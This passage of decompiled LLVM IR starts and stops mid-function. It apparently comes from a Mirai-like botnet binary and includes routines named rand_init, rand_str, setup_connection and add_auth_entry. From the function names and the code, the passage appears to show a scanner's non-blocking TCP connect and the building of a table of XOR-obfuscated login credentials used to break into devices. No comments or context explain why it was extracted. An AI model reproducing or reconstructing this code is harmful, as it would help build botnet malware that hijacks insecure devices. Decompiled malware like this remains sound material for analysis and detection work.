  %v2_dd7c = load i32, i32* @global_var_216ec.119, align 4
  %v2_dd80 = xor i32 %v5_dd74, %v5_dd70
  %v4_dd84 = udiv i32 %v5_dd70, 256
  %v5_dd84 = xor i32 %v2_dd80, %v4_dd84
  store i32 %v2_dd78, i32* @global_var_216e4.113, align 4
  store i32 %v2_dd7c, i32* @global_var_216e8.117, align 4
  store i32 %v2_dd64, i32* @global_var_216ec.119, align 4
  store i32 %v5_dd84, i32* @global_var_216f0.115, align 4
  ret i32 %v5_dd84

; uselistorder directives
  uselistorder i32 %v2_dd64, { 2, 1, 0 }
  uselistorder i32 %v2_dd60, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ddbc = call i32 @__GI_time(i32* null)
  store i32 %v2_ddbc, i32* @global_var_216e4.113, align 4
  %v1_ddc8 = call i32 @__getpid(i32 %v2_ddbc)
  store i32 %v1_ddc8, i32* @r0, align 4
  %v0_ddd0 = call i32 @getppid()
  %v2_ddd8 = xor i32 %v1_ddc8, %v0_ddd0
  store i32 %v2_ddd8, i32* @global_var_216e8.117, align 4
  %v1_dde0 = call i32 @clock(i32 %v2_ddd8)
  %v2_dde4 = load i32, i32* @global_var_216e8.117, align 4
  %v2_ddf0 = xor i32 %v2_dde4, %v1_dde0
  store i32 %v2_ddf0, i32* @global_var_216f0.115, align 4
  store i32 %v1_dde0, i32* @global_var_216ec.119, align 4
  ret i32 %v1_dde0

; uselistorder directives
  uselistorder i32 %v1_dde0, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_de18 = load i32, i32* @r4, align 4
  %v6_de18 = load i32, i32* @r5, align 4
  %v9_de18 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_de2c = call i32 @table_unlock_val(i32 28)
  %v3_de38 = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_de38, i32* @r1, align 4
  %v2_de44 = bitcast i32* %stack_var_-72 to i8*
  %v3_de44 = call i32 @strcpy(i8* %v2_de44, i32 %v3_de38)
  %v2_de48 = icmp eq i32 %arg2, 0
  br i1 %v2_de48, label %dec_label_pc_dec4, label %dec_label_pc_de50

dec_label_pc_de50:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_216e4.113 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216e8.117 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216ec.119 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216f0.115 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_dea8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %dec_label_pc_de64.dec_label_pc_de64_crit_edge, %dec_label_pc_de50
  %v1_de88 = phi i32 [ %v1_de88.pre, %dec_label_pc_de64.dec_label_pc_de64_crit_edge ], [ ptrtoint (i32* @global_var_216e4.113 to i32), %dec_label_pc_de50 ]
  %v2_de64 = load i32, i32* @global_var_216f0.115, align 4
  store i32 %v2_de64, i32* %r2.global-to-local, align 4
  %v2_de68 = load i32, i32* @global_var_216e4.113, align 4
  %v4_de6c = udiv i32 %v2_de64, 524288
  %v5_de6c = xor i32 %v4_de6c, %v2_de64
  %v4_de70 = mul i32 %v2_de68, 2048
  %v5_de70 = xor i32 %v4_de70, %v2_de68
  %v2_de74 = xor i32 %v5_de6c, %v5_de70
  %v2_de78 = load i32, i32* @global_var_216e8.117, align 4
  %v2_de7c = load i32, i32* @global_var_216ec.119, align 4
  store i32 %v2_de7c, i32* %ip.global-to-local, align 4
  %v4_de80 = udiv i32 %v5_de70, 256
  %v5_de80 = xor i32 %v2_de74, %v4_de80
  store i32 %v5_de80, i32* @r4, align 4
  %v2_de88 = inttoptr i32 %v1_de88 to i32*
  store i32 %v2_de78, i32* %v2_de88, align 4
  %v0_de8c = load i32, i32* %ip.global-to-local, align 4
  %v1_de8c = load i32, i32* %r8.global-to-local, align 4
  %v2_de8c = inttoptr i32 %v1_de8c to i32*
  store i32 %v0_de8c, i32* %v2_de8c, align 4
  %v0_de90 = load i32, i32* %r2.global-to-local, align 4
  %v1_de90 = load i32, i32* %r7.global-to-local, align 4
  %v2_de90 = inttoptr i32 %v1_de90 to i32*
  store i32 %v0_de90, i32* %v2_de90, align 4
  %v0_de94 = load i32, i32* @r4, align 4
  %v1_de94 = load i32, i32* @r6, align 4
  %v2_de94 = inttoptr i32 %v1_de94 to i32*
  store i32 %v0_de94, i32* %v2_de94, align 4
  %v2_de98 = call i32 @util_strlen(i8* %v2_de44)
  %v0_dea0 = load i32, i32* @r4, align 4
  %v3_dea4 = urem i32 %v0_dea0, %v2_de98
  %v2_deac = add i32 %v3_dea4, %v2_dea8
  %v1_deb0 = add i32 %v2_deac, -32
  %v2_deb0 = inttoptr i32 %v1_deb0 to i8*
  %v3_deb0 = load i8, i8* %v2_deb0, align 1
  %v2_deb4 = load i32, i32* @r5, align 4
  %v3_deb4 = load i32, i32* %fp.global-to-local, align 4
  %v4_deb4 = add i32 %v3_deb4, %v2_deb4
  %v5_deb4 = inttoptr i32 %v4_deb4 to i8*
  store i8 %v3_deb0, i8* %v5_deb4, align 1
  %v0_deb8 = load i32, i32* @r5, align 4
  %v1_deb8 = add i32 %v0_deb8, 1
  store i32 %v1_deb8, i32* @r5, align 4
  %v1_debc = load i32, i32* %sb.global-to-local, align 4
  %v9_debc = icmp eq i32 %v1_deb8, %v1_debc
  br i1 %v9_debc, label %dec_label_pc_dec4, label %dec_label_pc_de64.dec_label_pc_de64_crit_edge

dec_label_pc_de64.dec_label_pc_de64_crit_edge:    ; preds = %dec_label_pc_de64
  %v1_de88.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_de64

dec_label_pc_dec4:                                ; preds = %dec_label_pc_de64, %entry
  %v1_dec8 = call i32 @table_lock_val(i32 28)
  store i32 %v3_de18, i32* @r4, align 4
  store i32 %v6_de18, i32* @r5, align 4
  store i32 %v9_de18, i32* @r6, align 4
  ret i32 %v1_dec8

; uselistorder directives
  uselistorder i32 %v2_de68, { 1, 0 }
  uselistorder i32 %v2_de64, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_dee8 = load i32, i32* %r1.global-to-local, align 4
  %v3_deec = load i32, i32* @r4, align 4
  store i32 %v3_deec, i32* %stack_var_-28, align 4
  %v0_def0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_def0, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_dee8, 1
  br i1 %tmp16, label %dec_label_pc_df98, label %dec_label_pc_def8

dec_label_pc_def8:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_216f0.115 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216ec.119 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216e8.117 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216e4.113 to i32), i32* %r6.global-to-local, align 4
  %v2_df08 = load i32, i32* @global_var_216f0.115, align 4
  store i32 %v2_df08, i32* %lr.global-to-local, align 4
  %v2_df0c = load i32, i32* @global_var_216ec.119, align 4
  store i32 %v2_df0c, i32* %r4.global-to-local, align 4
  %v2_df10 = load i32, i32* @global_var_216e8.117, align 4
  store i32 %v2_df10, i32* %r0.global-to-local, align 4
  %v2_df14 = load i32, i32* @global_var_216e4.113, align 4
  br label %dec_label_pc_df38

dec_label_pc_df1c:                                ; preds = %dec_label_pc_df58
  %v1_df1c = trunc i32 %v5_df48 to i16
  %v3_df1c = inttoptr i32 %v9_df4c to i16*
  store i16 %v1_df1c, i16* %v3_df1c, align 2
  %v4_df1c = load i32, i32* %r5.global-to-local, align 4
  %v5_df1c = add i32 %v4_df1c, -2
  store i32 %v5_df1c, i32* %r5.global-to-local, align 4
  %v0_df20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_df20

dec_label_pc_df20:                                ; preds = %.thread, %dec_label_pc_df1c
  %v0_df20 = phi i32 [ %v9_df50, %.thread ], [ %v0_df20.pre, %dec_label_pc_df1c ]
  %v2_df1c5 = phi i32 [ %v12_df4c, %.thread ], [ %v5_df1c, %dec_label_pc_df1c ]
  %tmp17 = icmp slt i32 %v0_df20, 1
  br i1 %tmp17, label %dec_label_pc_dfa0, label %dec_label_pc_df2c

dec_label_pc_df2c:                                ; preds = %dec_label_pc_df20
  %v0_df24 = load i32, i32* %r0.global-to-local, align 4
  %v0_df2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_df2c, i32* %r0.global-to-local, align 4
  %v0_df30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_df30, i32* %r4.global-to-local, align 4
  %v0_df34 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_df34, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_df38

dec_label_pc_df38:                                ; preds = %dec_label_pc_def8, %dec_label_pc_df2c
  %v0_df84 = phi i32 [ %v2_df10, %dec_label_pc_def8 ], [ %v0_df2c, %dec_label_pc_df2c ]
  %v9_df4c = phi i32 [ %v0_def0, %dec_label_pc_def8 ], [ %v2_df1c5, %dec_label_pc_df2c ]
  %v0_df64 = phi i32 [ %v0_dee8, %dec_label_pc_def8 ], [ %v0_df20, %dec_label_pc_df2c ]
  %v0_df78 = phi i32 [ %v2_df08, %dec_label_pc_def8 ], [ %v0_df34, %dec_label_pc_df2c ]
  %v0_df74 = phi i32 [ %v2_df14, %dec_label_pc_def8 ], [ %v0_df24, %dec_label_pc_df2c ]
  %v4_df38 = mul i32 %v0_df74, 2048
  %v5_df38 = xor i32 %v4_df38, %v0_df74
  %v4_df3c = udiv i32 %v0_df78, 524288
  %v5_df3c = xor i32 %v4_df3c, %v0_df78
  %v2_df40 = xor i32 %v5_df3c, %v5_df38
  %v4_df48 = udiv i32 %v5_df38, 256
  %v5_df48 = xor i32 %v2_df40, %v4_df48
  store i32 %v5_df48, i32* %r3.global-to-local, align 4
  %v7_df4c = icmp sgt i32 %v0_df64, 3
  br i1 %v7_df4c, label %.thread, label %dec_label_pc_df58

.thread:                                          ; preds = %dec_label_pc_df38
  %v10_df4c = inttoptr i32 %v9_df4c to i32*
  store i32 %v5_df48, i32* %v10_df4c, align 4
  %v11_df4c = load i32, i32* %r5.global-to-local, align 4
  %v12_df4c = add i32 %v11_df4c, 4
  store i32 %v12_df4c, i32* %r5.global-to-local, align 4
  %v8_df50 = load i32, i32* %r1.global-to-local, align 4
  %v9_df50 = add i32 %v8_df50, -4
  store i32 %v9_df50, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_df20

dec_label_pc_df58:                                ; preds = %dec_label_pc_df38
  %v7_df64 = icmp eq i32 %v0_df64, 1
  store i32 %v5_df48, i32* %r3.global-to-local, align 4
  %v1_df6c = add i32 %v0_df64, -2
  store i32 %v1_df6c, i32* %r1.global-to-local, align 4
  br i1 %v7_df64, label %dec_label_pc_df74, label %dec_label_pc_df1c

dec_label_pc_df74:                                ; preds = %dec_label_pc_df58
  store i32 %v5_df48, i32* %r3.global-to-local, align 4
  %v1_df84 = load i32, i32* %r6.global-to-local, align 4
  %v2_df84 = inttoptr i32 %v1_df84 to i32*
  store i32 %v0_df84, i32* %v2_df84, align 4
  %v0_df88 = load i32, i32* %r4.global-to-local, align 4
  %v1_df88 = load i32, i32* %r7.global-to-local, align 4
  %v2_df88 = inttoptr i32 %v1_df88 to i32*
  store i32 %v0_df88, i32* %v2_df88, align 4
  %v0_df8c = load i32, i32* %lr.global-to-local, align 4
  %v1_df8c = load i32, i32* %r8.global-to-local, align 4
  %v2_df8c = inttoptr i32 %v1_df8c to i32*
  store i32 %v0_df8c, i32* %v2_df8c, align 4
  %v0_df90 = load i32, i32* %r3.global-to-local, align 4
  %v1_df90 = load i32, i32* %sl.global-to-local, align 4
  %v2_df90 = inttoptr i32 %v1_df90 to i32*
  store i32 %v0_df90, i32* %v2_df90, align 4
  %v0_df94 = load i32, i32* %r3.global-to-local, align 4
  %v1_df94 = trunc i32 %v0_df94 to i8
  %v2_df94 = load i32, i32* %r5.global-to-local, align 4
  %v3_df94 = inttoptr i32 %v2_df94 to i8*
  store i8 %v1_df94, i8* %v3_df94, align 1
  br label %dec_label_pc_df98

dec_label_pc_df98:                                ; preds = %entry, %dec_label_pc_dfa0, %dec_label_pc_df74
  %v2_df98 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_df98, i32* @r4, align 4
  %v1_df9c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_df9c

dec_label_pc_dfa0:                                ; preds = %dec_label_pc_df20
  %v0_dfa0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfa0 = load i32, i32* %sl.global-to-local, align 4
  %v2_dfa0 = inttoptr i32 %v1_dfa0 to i32*
  store i32 %v0_dfa0, i32* %v2_dfa0, align 4
  %v0_dfa4 = load i32, i32* %lr.global-to-local, align 4
  %v1_dfa4 = load i32, i32* %r8.global-to-local, align 4
  %v2_dfa4 = inttoptr i32 %v1_dfa4 to i32*
  store i32 %v0_dfa4, i32* %v2_dfa4, align 4
  %v0_dfa8 = load i32, i32* %r4.global-to-local, align 4
  %v1_dfa8 = load i32, i32* %r7.global-to-local, align 4
  %v2_dfa8 = inttoptr i32 %v1_dfa8 to i32*
  store i32 %v0_dfa8, i32* %v2_dfa8, align 4
  %v0_dfac = load i32, i32* %r0.global-to-local, align 4
  %v1_dfac = load i32, i32* %r6.global-to-local, align 4
  %v2_dfac = inttoptr i32 %v1_dfac to i32*
  store i32 %v0_dfac, i32* %v2_dfac, align 4
  br label %dec_label_pc_df98

; uselistorder directives
  uselistorder i32 %v9_df50, { 1, 0 }
  uselistorder i32 %v12_df4c, { 1, 0 }
  uselistorder i32 %v5_df48, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_df74, { 1, 0 }
  uselistorder i32 %v0_df78, { 1, 0 }
  uselistorder i32 %v0_df64, { 1, 0, 2 }
  uselistorder i32 %v0_df20, { 1, 0 }
  uselistorder i32 %v0_dee8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_216e4.113, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_216e4.113 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_216e8.117, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_216ec.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_216f0.115, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_df98, { 1, 2, 0 }
  uselistorder label %dec_label_pc_df38, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_dfc4 = load i32, i32* @r4, align 4
  store i32 %v3_dfc4, i32* %stack_var_-16, align 4
  %v6_dfc4 = load i32, i32* @r5, align 4
  %v9_dfc4 = load i32, i32* @r6, align 4
  %v12_dfc4 = load i32, i32* @lr, align 4
  %v0_dfc8 = load i32, i32* @r0, align 4
  store i32 %v0_dfc8, i32* @r5, align 4
  %v1_dfcc = add i32 %v0_dfc8, 4
  %v2_dfcc = inttoptr i32 %v1_dfcc to i32*
  %v3_dfcc = load i32, i32* %v2_dfcc, align 4
  store i32 %v3_dfcc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 57328, i32* @lr, align 4
  %v1_dfec = icmp ne i32 %v3_dfcc, -1
  call void @__pseudo_cond_branch(i1 %v1_dfec, i32 ptrtoint (i32* @global_var_13d50.107 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_dff8 = load i32, i32* @r6, align 4
  store i32 %v0_dff8, i32* %r2.global-to-local, align 4
  %v3_dffc = call i32 @socket(i32 2, i32 1, i32 %v0_dff8)
  store i32 %v3_dffc, i32* %r0.global-to-local, align 4
  %v7_e000 = icmp eq i32 %v3_dffc, -1
  %v1_e004 = load i32, i32* @r5, align 4
  %v2_e004 = add i32 %v1_e004, 4
  %v3_e004 = inttoptr i32 %v2_e004 to i32*
  store i32 %v3_dffc, i32* %v3_e004, align 4
  br i1 %v7_e000, label %entry.dec_label_pc_e07c_crit_edge, label %dec_label_pc_e00c

entry.dec_label_pc_e07c_crit_edge:                ; preds = %entry
  %v1_e084.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e07c

dec_label_pc_e00c:                                ; preds = %entry
  %v2_dfd0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e00c = load i32, i32* @r5, align 4
  %v1_e00c = add i32 %v0_e00c, 28
  store i32 %v1_e00c, i32* @r0, align 4
  %v0_e010 = load i32, i32* @r6, align 4
  %v2_e010 = add i32 %v0_e00c, 24
  %v3_e010 = inttoptr i32 %v2_e010 to i32*
  store i32 %v0_e010, i32* %v3_e010, align 4
  store i32 256, i32* @r1, align 4
  %v0_e018 = call i32 @util_zero()
  store i32 %v0_e018, i32* %r0.global-to-local, align 4
  %v0_e01c = load i32, i32* @r5, align 4
  %v1_e01c = add i32 %v0_e01c, 4
  %v2_e01c = inttoptr i32 %v1_e01c to i32*
  %v3_e01c = load i32, i32* %v2_e01c, align 4
  store i32 %v3_e01c, i32* @r4, align 4
  %v0_e020 = load i32, i32* @r6, align 4
  store i32 %v0_e020, i32* @r2, align 4
  store i32 %v3_e01c, i32* %r0.global-to-local, align 4
  %v2_e02c = call i32 @__libc_fcntl(i32 %v3_e01c, i32 3)
  %v1_e034 = or i32 %v2_e02c, 2048
  store i32 %v1_e034, i32* @r2, align 4
  %v0_e038 = load i32, i32* @r4, align 4
  store i32 %v0_e038, i32* %r0.global-to-local, align 4
  %v2_e03c = call i32 @__libc_fcntl(i32 %v0_e038, i32 4)
  store i32 %v2_e03c, i32* %r0.global-to-local, align 4
  %v2_e044 = load i32, i32* @global_var_21728.133, align 4
  store i32 %v2_e044, i32* %r2.global-to-local, align 4
  %v1_e04c = load i32, i32* @r5, align 4
  %v2_e04c = add i32 %v1_e04c, 12
  %v3_e04c = inttoptr i32 %v2_e04c to i32*
  store i32 1, i32* %v3_e04c, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e058 = load i32, i32* %r2.global-to-local, align 4
  %v1_e058 = load i32, i32* @r5, align 4
  %v2_e058 = add i32 %v1_e058, 8
  %v3_e058 = inttoptr i32 %v2_e058 to i32*
  store i32 %v0_e058, i32* %v3_e058, align 4
  %v0_e05c = load i32, i32* @r5, align 4
  %v1_e060 = add i32 %v0_e05c, 4
  %v2_e060 = inttoptr i32 %v1_e060 to i32*
  %v3_e060 = load i32, i32* %v2_e060, align 4
  store i32 %v3_e060, i32* %r0.global-to-local, align 4
  %v1_e064 = add i32 %v0_e05c, 20
  %v2_e064 = inttoptr i32 %v1_e064 to i16*
  %v3_e064 = load i16, i16* %v2_e064, align 2
  %v4_e064 = zext i16 %v3_e064 to i32
  store i32 %v4_e064, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e078 = call i32 @__libc_connect(i32 %v3_e060, i32 %v2_dfd0, i32 16)
  store i32 %v3_e078, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e07c

dec_label_pc_e07c:                                ; preds = %entry.dec_label_pc_e07c_crit_edge, %dec_label_pc_e00c
  %v1_e084 = phi i32 [ %v1_e084.pre, %entry.dec_label_pc_e07c_crit_edge ], [ %v3_e078, %dec_label_pc_e00c ]
  %v2_e080 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e080, i32* @r4, align 4
  store i32 %v6_dfc4, i32* @r5, align 4
  store i32 %v9_dfc4, i32* @r6, align 4
  store i32 %v12_dfc4, i32* @lr, align 4
  ret i32 %v1_e084

; uselistorder directives
  uselistorder i32 %v3_dffc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e07c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e08c = load i32, i32* @r4, align 4
  %v6_e08c = load i32, i32* @r5, align 4
  %v9_e08c = load i32, i32* @r6, align 4
  %v12_e08c = load i32, i32* @r7, align 4
  %v15_e08c = load i32, i32* @r8, align 4
  %v18_e08c = load i32, i32* @sb, align 4
  %v21_e08c = load i32, i32* @sl, align 4
  %v24_e08c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_216f4.135 to i32), i32* @fp, align 4
  %v2_e094 = load i32, i32* @global_var_216f4.135, align 4
  store i32 ptrtoint (i32* @global_var_21720.137 to i32), i32* @sl, align 4
  %v1_e0a0 = add i32 %v2_e094, 1
  store i32 %v1_e0a0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e0ac = load i32, i32* @global_var_21720.137, align 4
  store i32 %v2_e0ac, i32* %r0.global-to-local, align 4
  %v3_e0b0 = mul i32 %v1_e0a0, 16
  store i32 %v3_e0b0, i32* %r1.global-to-local, align 4
  %v4_e0b8 = inttoptr i32 %v2_e0ac to i32*
  %v5_e0b8 = call i32 @realloc(i32* %v4_e0b8, i32 %v3_e0b0, i32 %arg3, i32 %v1_e0a0)
  %v2_e0bc = load i32, i32* @global_var_216f4.135, align 4
  store i32 %v2_e0bc, i32* %r2.global-to-local, align 4
  store i32 %v5_e0b8, i32* @r8, align 4
  %v0_e0c4 = load i32, i32* @r5, align 4
  store i32 %v0_e0c4, i32* %r0.global-to-local, align 4
  %v1_e0cc = load i32, i32* @sl, align 4
  %v2_e0cc = inttoptr i32 %v1_e0cc to i32*
  store i32 %v5_e0b8, i32* %v2_e0cc, align 4
  %v1_e0d0 = inttoptr i32 %v0_e0c4 to i8*
  %v2_e0d0 = call i32 @util_strlen(i8* %v1_e0d0)
  %sext = mul i32 %v2_e0d0, 16777216
  %v1_e0d4 = sdiv i32 %sext, 16777216
  %v2_e0d4 = add nsw i32 %v1_e0d4, 1
  store i32 %v2_e0d4, i32* @r4, align 4
  store i32 %v1_e0d4, i32* @r7, align 4
  store i32 %v2_e0d4, i32* @r0, align 4
  %v0_e0e0 = call i32 @malloc()
  store i32 %v0_e0e0, i32* %r0.global-to-local, align 4
  %v0_e0e4 = load i32, i32* @r5, align 4
  store i32 %v0_e0e4, i32* %r1.global-to-local, align 4
  %v0_e0e8 = load i32, i32* @r4, align 4
  store i32 %v0_e0e8, i32* %r2.global-to-local, align 4
  store i32 %v0_e0e0, i32* %r6.global-to-local, align 4
  %v3_e0f0 = call i32 @util_memcpy(i32 %v0_e0e0, i32 %v0_e0e4, i32 %v0_e0e8)
  store i32 %v3_e0f0, i32* %r0.global-to-local, align 4
  %v0_e0f4 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e0f4, 1
  %extract.t6 = trunc i32 %v0_e0f4 to i8
  br i1 %tmp22, label %dec_label_pc_e118, label %dec_label_pc_e0fc

dec_label_pc_e0fc:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e100, %dec_label_pc_e0fc
  %v2_e108 = phi i32 [ %v1_e10c, %dec_label_pc_e100 ], [ 0, %dec_label_pc_e0fc ]
  %v1_e100 = load i32, i32* %r6.global-to-local, align 4
  %v2_e100 = add i32 %v1_e100, %v2_e108
  %v3_e100 = inttoptr i32 %v2_e100 to i8*
  %v4_e100 = load i8, i8* %v3_e100, align 1
  %v6_e100 = zext i8 %v4_e100 to i32
  %v1_e104 = xor i32 %v6_e100, 84
  store i32 %v1_e104, i32* %r3.global-to-local, align 4
  %v1_e108 = trunc i32 %v1_e104 to i8
  store i8 %v1_e108, i8* %v3_e100, align 1
  %v0_e10c = load i32, i32* %r2.global-to-local, align 4
  %v1_e10c = add i32 %v0_e10c, 1
  store i32 %v1_e10c, i32* %r2.global-to-local, align 4
  %v1_e110 = load i32, i32* @r7, align 4
  %v9_e110 = icmp eq i32 %v1_e10c, %v1_e110
  br i1 %v9_e110, label %dec_label_pc_e118.loopexit, label %dec_label_pc_e100

dec_label_pc_e118.loopexit:                       ; preds = %dec_label_pc_e100
  %extract.t = trunc i32 %v1_e10c to i8
  br label %dec_label_pc_e118

dec_label_pc_e118:                                ; preds = %dec_label_pc_e118.loopexit, %entry
  %v0_e128.off0 = phi i8 [ %extract.t, %dec_label_pc_e118.loopexit ], [ %extract.t6, %entry ]
  %v2_e118 = load i32, i32* @global_var_216f4.135, align 4
  %v2_e11c = load i32, i32* @global_var_21720.137, align 4
  %v3_e120 = mul i32 %v2_e118, 16
  store i32 %v3_e120, i32* @sb, align 4
  %v2_e124 = add i32 %v2_e11c, %v3_e120
  store i32 %v2_e124, i32* %r2.global-to-local, align 4
  %v3_e128 = add i32 %v2_e124, 12
  %v4_e128 = inttoptr i32 %v3_e128 to i8*
  store i8 %v0_e128.off0, i8* %v4_e128, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e0bc, i32* %r3.global-to-local, align 4
  %v0_e134 = load i32, i32* %r6.global-to-local, align 4
  %v1_e134 = load i32, i32* @r8, align 4
  %v5_e134 = mul i32 %v2_e0bc, 16
  %v6_e134 = add i32 %v1_e134, %v5_e134
  %v7_e134 = inttoptr i32 %v6_e134 to i32*
  store i32 %v0_e134, i32* %v7_e134, align 4
  %v2_e138 = load i32, i32* @global_var_21720.137, align 4
  store i32 %v2_e138, i32* @r7, align 4
  %v1_e13c = inttoptr i32 %arg2 to i8*
  %v2_e13c = call i32 @util_strlen(i8* %v1_e13c)
  %sext1 = mul i32 %v2_e13c, 16777216
  %v1_e140 = sdiv i32 %sext1, 16777216
  %v2_e140 = add nsw i32 %v1_e140, 1
  store i32 %v2_e140, i32* @r4, align 4
  store i32 %v1_e140, i32* @r6, align 4
  store i32 %v2_e140, i32* @r0, align 4
  %v0_e14c = call i32 @malloc()
  store i32 %v0_e14c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e154 = load i32, i32* @r4, align 4
  store i32 %v0_e154, i32* %r2.global-to-local, align 4
  store i32 %v0_e14c, i32* %r5.global-to-local, align 4
  %v3_e15c = call i32 @util_memcpy(i32 %v0_e14c, i32 %arg2, i32 %v0_e154)
  store i32 %v3_e15c, i32* %r0.global-to-local, align 4
  %v0_e160 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e160, 1
  %extract.t8 = trunc i32 %v0_e160 to i8
  br i1 %tmp23, label %dec_label_pc_e184, label %dec_label_pc_e168

dec_label_pc_e168:                                ; preds = %dec_label_pc_e118
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e16c

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e16c, %dec_label_pc_e168
  %v2_e174 = phi i32 [ %v1_e178, %dec_label_pc_e16c ], [ 0, %dec_label_pc_e168 ]
  %v1_e16c = load i32, i32* %r5.global-to-local, align 4
